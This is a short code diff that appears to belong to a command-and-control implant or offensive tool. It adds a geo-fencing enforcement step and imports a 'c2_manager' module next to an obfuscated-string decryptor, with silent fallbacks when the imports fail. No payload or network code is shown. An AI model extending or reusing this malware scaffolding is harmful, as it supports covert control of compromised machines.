@@ -12,6 +12,21 @@ try:
         sys.path.insert(0, _core)
     
     try:
+    # === G-01: Geo-Fencing Enforcement ===
+        try:
+            from core.geo_fence import GeoFence
+            GeoFence.enforce()
+        except Exception as e:
+            log_debug(f"GeoFence initialization failed: {e}")
+
+    # === Core Module Imports ===
+        try:
+            from core.error_logger import log_info, log_error
+            from core.c2 import c2_manager
+        except ImportError:
+            def log_info(msg, tag=""): pass
+            def log_error(msg, tag=""): pass
+            c2_manager = None
         from core.obfuscation import decrypt_string
     except ImportError:
         import base64
